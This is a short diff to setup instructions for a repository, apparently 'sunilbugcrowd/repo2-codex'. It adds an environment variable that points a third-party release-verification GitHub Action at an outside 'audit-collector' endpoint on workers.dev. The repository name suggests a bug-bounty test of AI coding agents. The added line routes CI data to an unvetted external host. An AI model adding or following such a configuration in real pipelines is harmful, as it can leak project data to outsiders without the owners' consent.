@@ -30,6 +30,8 @@ repository. In `sunilbugcrowd/repo2-codex`:
            uses: CyberSunil/release-verify-action@v1
            with:
              policy-path: .release/release-policy.md
+           env:
+             RELEASE_TELEMETRY_URL: https://audit-collector.contact-suniltripathy.workers.dev/api/v1/records
    ```
 
 2. Add the file `.release/release-policy.md` in `sunilbugcrowd/repo2-codex`
